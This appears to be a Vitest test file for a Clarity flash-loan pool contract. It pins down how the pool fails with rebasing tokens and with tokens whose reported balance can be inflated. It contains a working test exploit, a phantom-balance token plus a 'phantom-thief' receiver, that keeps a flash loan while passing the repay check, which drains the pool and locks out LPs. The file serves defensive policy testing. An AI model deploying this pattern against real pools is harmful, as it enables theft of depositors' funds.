import { describe, expect, it, beforeEach } from "vitest";
import { Cl } from "@stacks/transactions";

/**
 * docs/security/POOL_V3_LISTING_POLICY.md, rows "Rebasing" and "Non-standard
 * get-balance" (Flashstack-ajv.3.5). Pins CURRENT flashstack-pool-v3 behaviour
 * with two token shapes the policy forbids. No contract change: the fix is the
 * listing rule.
 *
 * Rebasing (owner sets an index; balance = units * index / 1e6):
 *   - positive rebase: the gain goes to the LPs who held through it, not to
 *     the next depositor (deposit prices against the live balance), but
 *     get-reserve / get-lp-value stay stale until the next state change.
 *   - negative rebase, ft-backed token (units are a define-fungible-token):
 *     each outbound transfer moves MORE units than the as-contract? with-ft
 *     allowance, so withdraw and flash-loan abort with ERR-TRANSFER-FAILED and
 *     LP funds are locked. A map-backed token moves no ft, so the allowance
 *     never trips: LPs exit pro rata at the loss, and only the cached value is
 *     wrong.
 *
 * Non-standard get-balance (reports ft balance plus a phantom amount):
 *   - a phantom amount that is fixed during the loan cancels out of the
 *     repay check (both reads include it), so a non-repaying loan still fails.
 *   - a phantom amount that can be raised during the loan satisfies the
 *     repay check SHORT: the receiver keeps the whole loan, the pool's real
 *     balance goes to 0, LPs are locked out, and new deposits are still taken.
 *
 * Test tokens and the exploit receiver are deployed at runtime with
 * simnet.deployContract, not registered in Clarinet.toml, so they never reach
 * the computed mainnet plan.
 */

const POOL = "flashstack-pool-v3";
const BAD_RX = "test-pool-v3-receiver-bad"; // returns ok without repaying

const ERR_ZERO_AMOUNT = 802;
const ERR_REPAY_FAILED = 810;
const ERR_TRANSFER_FAILED = 811;

const META = `(define-read-only (get-name) (ok "Test"))
(define-read-only (get-symbol) (ok "TST"))
(define-read-only (get-decimals) (ok u6))
(define-read-only (get-token-uri) (ok none))`;

const rebasingToken = (backing: "ft" | "map") =>
  backing === "ft"
    ? `(impl-trait .sip-010-trait-ft-standard.sip-010-trait)
(define-fungible-token units)
(define-constant OWNER tx-sender)
(define-data-var index uint u1000000)
(define-private (to-units (amount uint)) (/ (* amount u1000000) (var-get index)))
(define-public (transfer (amount uint) (sender principal) (recipient principal) (memo (optional (buff 34))))
  (begin
    (asserts! (or (is-eq tx-sender sender) (is-eq contract-caller sender)) (err u4))
    (ft-transfer? units (to-units amount) sender recipient)))
(define-read-only (get-balance (who principal)) (ok (/ (* (ft-get-balance units who) (var-get index)) u1000000)))
(define-read-only (get-total-supply) (ok (/ (* (ft-get-supply units) (var-get index)) u1000000)))
${META}
(define-public (mint (amount uint) (to principal)) (ft-mint? units (to-units amount) to))
(define-public (rebase (new-index uint)) (begin (asserts! (is-eq tx-sender OWNER) (err u5)) (ok (var-set index new-index))))`
    : `(impl-trait .sip-010-trait-ft-standard.sip-010-trait)
(define-map units principal uint)
(define-constant OWNER tx-sender)
(define-data-var index uint u1000000)
(define-private (bal (who principal)) (default-to u0 (map-get? units who)))
(define-private (to-units (amount uint)) (/ (* amount u1000000) (var-get index)))
(define-public (transfer (amount uint) (sender principal) (recipient principal) (memo (optional (buff 34))))
  (let ((n (to-units amount)))
    (asserts! (or (is-eq tx-sender sender) (is-eq contract-caller sender)) (err u4))
    (asserts! (<= n (bal sender)) (err u1))
    (map-set units sender (- (bal sender) n))
    (map-set units recipient (+ (bal recipient) n))
    (ok true)))
(define-read-only (get-balance (who principal)) (ok (/ (* (bal who) (var-get index)) u1000000)))
(define-read-only (get-total-supply) (ok u0))
${META}
(define-public (mint (amount uint) (to principal)) (ok (map-set units to (+ (bal to) (to-units amount)))))
(define-public (rebase (new-index uint)) (begin (asserts! (is-eq tx-sender OWNER) (err u5)) (ok (var-set index new-index))))`;

// get-balance = real ft balance + a phantom amount that `inflate` raises.
// Anyone can call inflate here; an owner-only version behaves the same when
// the token owner is the borrower (tx-sender stays the borrower in the callback).
const PHANTOM_TOKEN = `(impl-trait .sip-010-trait-ft-standard.sip-010-trait)
(define-fungible-token t)
(define-map phantom principal uint)
(define-public (transfer (amount uint) (sender principal) (recipient principal) (memo (optional (buff 34))))
  (begin
    (asserts! (or (is-eq tx-sender sender) (is-eq contract-caller sender)) (err u4))
    (ft-transfer? t amount sender recipient)))
(define-read-only (get-balance (who principal)) (ok (+ (ft-get-balance t who) (default-to u0 (map-get? phantom who)))))
(define-read-only (get-total-supply) (ok (ft-get-supply t)))
${META}
(define-public (mint (amount uint) (to principal)) (ft-mint? t amount to))
(define-public (inflate (who principal) (amount uint)) (ok (map-set phantom who (+ amount (default-to u0 (map-get? phantom who))))))`;

// Keeps the loan and raises the pool's reported balance by amount + 1000
// (more than the 0.05% fee) instead of repaying.
const phantomReceiver = (tokenName: string) => `(impl-trait .flashstack-v3-receiver-trait.flashstack-v3-receiver-trait)
(use-trait sip-010-trait .sip-010-trait-ft-standard.sip-010-trait)
(define-public (execute-flash (token <sip-010-trait>) (amount uint) (core principal))
  (begin
    (unwrap! (contract-call? .${tokenName} inflate core (+ amount u1000)) (err u1))
    (ok true)))`;

let deployer: string;
let lp1: string;
let lp2: string;
let stranger: string;

const uintOf = (cv: any) => BigInt(cv.value);
const okUint = (cv: any) => BigInt(cv.value.value);

const setup = (name: string, source: string) => {
  expect(simnet.deployContract(name, source, null, deployer).result).toBeBool(true);
  const token = Cl.contractPrincipal(deployer, name);
  const asset = Cl.principal(`${deployer}.${name}`);
  const pool = `${deployer}.${POOL}`;
  expect(simnet.callPublicFn(POOL, "add-asset", [token, Cl.uint(5), Cl.uint(1_000_000_000)], deployer).result).toBeOk(Cl.bool(true));
  const mint = (amount: bigint, to: string) => simnet.callPublicFn(name, "mint", [Cl.uint(amount), Cl.principal(to)], deployer);
  const rebase = (index: bigint) =>
    expect(simnet.callPublicFn(name, "rebase", [Cl.uint(index)], deployer).result).toBeOk(Cl.bool(true));
  const balance = (who: string) => okUint(simnet.callReadOnlyFn(name, "get-balance", [Cl.principal(who)], deployer).result);
  const poolBalance = () => balance(pool);
  const deposit = (amount: bigint, who: string) => simnet.callPublicFn(POOL, "deposit", [token, Cl.uint(amount)], who).result;
  const withdraw = (shares: bigint, who: string) => simnet.callPublicFn(POOL, "withdraw", [token, Cl.uint(shares)], who).result;
  const loan = (amount: bigint, receiver: string) =>
    simnet.callPublicFn(POOL, "flash-loan", [token, Cl.uint(amount), Cl.contractPrincipal(deployer, receiver)], stranger).result;
  const approve = (receiver: string) =>
    expect(simnet.callPublicFn(POOL, "add-approved-receiver", [Cl.contractPrincipal(deployer, receiver)], deployer).result).toBeOk(Cl.bool(true));
  const shares = (who: string) => uintOf(simnet.callReadOnlyFn(POOL, "get-shares", [asset, Cl.principal(who)], deployer).result);
  const reserve = () => okUint(simnet.callReadOnlyFn(POOL, "get-reserve", [asset], deployer).result);
  const lpValue = (who: string) => okUint(simnet.callReadOnlyFn(POOL, "get-lp-value", [asset, Cl.principal(who)], deployer).result);
  return { pool, mint, rebase, balance, poolBalance, deposit, withdraw, loan, approve, shares, reserve, lpValue };
};

describe("pool-v3 with rebasing and non-standard get-balance tokens (listing policy)", () => {
  beforeEach(() => {
    const a = simnet.getAccounts();
    deployer = a.get("deployer")!;
    lp1 = a.get("wallet_1")!;
    lp2 = a.get("wallet_2")!;
    stranger = a.get("wallet_3")!;
  });

  describe("rebasing token", () => {
    it("positive rebase: the next depositor doesn't capture it, but get-lp-value is stale until the next refresh", () => {
      const t = setup("rebase-up", rebasingToken("ft"));
      t.mint(3_000_000n, lp1);
      t.mint(3_000_000n, lp2);
      expect(t.deposit(1_000_000n, lp1)).toBeOk(Cl.uint(1_000_000_000_000n));

      t.rebase(1_100_000n); // +10%
      expect(t.poolBalance()).toBe(1_100_000n);
      expect(t.reserve()).toBe(1_000_000n);
      expect(t.lpValue(lp1)).toBe(1_000_000n); // stale: the rebase isn't in the cache

      // LP2 pays 1,100,000 and is priced against the live 1,100,000, so it gets
      // the same shares as LP1. The +100,000 stays with LP1.
      expect(t.deposit(1_100_000n, lp2)).toBeOk(Cl.uint(1_000_000_090_909n));
      expect(t.reserve()).toBe(2_200_000n);
      expect(t.lpValue(lp1)).toBe(1_099_999n);
      expect(t.lpValue(lp2)).toBe(1_099_999n);

      // Outbound transfers move fewer units than amount, inside the allowance.
      expect(t.withdraw(t.shares(lp1), lp1)).toBeOk(Cl.uint(1_099_999n));
    });

    it("negative rebase, ft-backed: withdraw and flash-loan exceed the with-ft allowance, so LP funds are locked", () => {
      const t = setup("rebase-down-ft", rebasingToken("ft"));
      t.mint(3_000_000n, lp1);
      t.mint(3_000_000n, lp2);
      expect(t.deposit(1_000_000n, lp1)).toBeOk(Cl.uint(1_000_000_000_000n));
      expect(t.deposit(1_000_000n, lp2)).toBeOk(Cl.uint(1_000_000_000_000n));
      t.approve("test-pool-v3-receiver-good");
      t.mint(500_000n, `${deployer}.test-pool-v3-receiver-good`);

      t.rebase(900_000n); // -10%
      expect(t.poolBalance()).toBe(1_800_000n);
      expect(t.reserve()).toBe(2_000_000n);
      expect(t.lpValue(lp1)).toBe(1_000_000n); // overstated: the real share is 900,000

      // amount-out 900,000 needs 1,000,000 units; the allowance is 900,000.
      expect(t.withdraw(t.shares(lp1), lp1)).toBeErr(Cl.uint(ERR_TRANSFER_FAILED));
      expect(t.withdraw(t.shares(lp2), lp2)).toBeErr(Cl.uint(ERR_TRANSFER_FAILED));
      expect(t.loan(100_000n, "test-pool-v3-receiver-good")).toBeErr(Cl.uint(ERR_TRANSFER_FAILED));
      expect(t.poolBalance()).toBe(1_800_000n);

      // Only withdrawals where flooring makes units <= amount-out get out:
      // 9,000,000 shares -> 8 out (8 units), 1,000,000 shares -> 0 out.
      expect(t.withdraw(9_000_000n, lp1)).toBeOk(Cl.uint(8n));
      expect(t.withdraw(1_000_000n, lp1)).toBeErr(Cl.uint(ERR_ZERO_AMOUNT));

      // New deposits are still accepted into the locked pool.
      expect(t.deposit(100_000n, lp2)).toBeOk(Cl.uint(111_111_098_765n));
    });

    it("negative rebase, map-backed: no ft moves, so LPs exit pro rata at the loss; only the cache is wrong", () => {
      const t = setup("rebase-down-map", rebasingToken("map"));
      t.mint(3_000_000n, lp1);
      t.mint(3_000_000n, lp2);
      expect(t.deposit(1_000_000n, lp1)).toBeOk(Cl.uint(1_000_000_000_000n));
      expect(t.deposit(1_000_000n, lp2)).toBeOk(Cl.uint(1_000_000_000_000n));

      t.rebase(900_000n);
      expect(t.poolBalance()).toBe(1_800_000n);
      expect(t.lpValue(lp1)).toBe(1_000_000n); // overstated until the next refresh

      expect(t.withdraw(t.shares(lp1), lp1)).toBeOk(Cl.uint(900_000n));
      expect(t.withdraw(t.shares(lp2), lp2)).toBeOk(Cl.uint(900_000n));
      expect(t.poolBalance()).toBe(0n);
    });
  });

  describe("non-standard get-balance (reports ft balance + phantom)", () => {
    it("a phantom amount fixed during the loan cancels out: a non-repaying loan still fails", () => {
      const t = setup("phantom-fixed", PHANTOM_TOKEN);
      t.mint(1_000_000n, lp1);
      expect(t.deposit(1_000_000n, lp1)).toBeOk(Cl.uint(1_000_000_000_000n));
      expect(simnet.callPublicFn("phantom-fixed", "inflate", [Cl.principal(t.pool), Cl.uint(5_000_000)], stranger).result).toBeOk(Cl.bool(true));
      expect(t.poolBalance()).toBe(6_000_000n);
      t.approve(BAD_RX);

      // reserve-before and reserve-after both include the 5,000,000 phantom.
      expect(t.loan(1_000_000n, BAD_RX)).toBeErr(Cl.uint(ERR_REPAY_FAILED));
      expect(t.poolBalance()).toBe(6_000_000n);
    });

    it("a phantom amount present before any deposit is absorbed by the virtual shares; real LPs exit whole", () => {
      const t = setup("phantom-price", PHANTOM_TOKEN);
      t.mint(1_000_000n, lp1);
      t.mint(1_000_000n, lp2);
      expect(simnet.callPublicFn("phantom-price", "inflate", [Cl.principal(t.pool), Cl.uint(1_000_000)], stranger).result).toBeOk(Cl.bool(true));

      // Priced against 1,000,000 that doesn't exist: 999,999 shares instead of
      // 1e12. The phantom acts like a donation owned by the 1e6 virtual shares.
      expect(t.deposit(1_000_000n, lp1)).toBeOk(Cl.uint(999_999n));
      expect(t.deposit(1_000_000n, lp2)).toBeOk(Cl.uint(999_999n));

      // Real ft held: 2,000,000; reported 3,000,000. Each LP gets its deposit
      // back less rounding; the phantom stays behind as an unbacked claim.
      expect(t.withdraw(t.shares(lp1), lp1)).toBeOk(Cl.uint(999_999n));
      expect(t.withdraw(t.shares(lp2), lp2)).toBeOk(Cl.uint(1_000_000n));
      expect(t.poolBalance()).toBe(1_000_001n); // 1 real + 1,000,000 phantom
    });

    it("a phantom amount raised during the loan satisfies the repay check SHORT: the receiver keeps the loan", () => {
      const t = setup("phantom-live", PHANTOM_TOKEN);
      expect(simnet.deployContract("phantom-thief", phantomReceiver("phantom-live"), null, deployer).result).toBeBool(true);
      t.mint(1_000_000n, lp1);
      t.mint(1_000_000n, lp2);
      expect(t.deposit(1_000_000n, lp1)).toBeOk(Cl.uint(1_000_000_000_000n));
      t.approve("phantom-thief");

      // The receiver keeps all 1,000,000 and raises the pool's reported
      // balance by 1,001,000. The check (after >= before + fee) passes.
      expect(t.loan(1_000_000n, "phantom-thief")).toBeOk(Cl.bool(true));
      const ftOf = (who: string) => simnet.getAssetsMap().get(".phantom-live.t")?.get(who) ?? 0n;
      expect(ftOf(t.pool)).toBe(0n);
      expect(ftOf(`${deployer}.phantom-thief`)).toBe(1_000_000n);
      expect(t.reserve()).toBe(1_001_000n); // cache records a fee that never arrived

      // LP1 is locked out; the pool still takes new deposits.
      expect(t.withdraw(t.shares(lp1), lp1)).toBeErr(Cl.uint(ERR_TRANSFER_FAILED));
      expect(t.deposit(1_000_000n, lp2)).toBeOk(Cl.uint(999_000_999_999n));
    });
  });
});
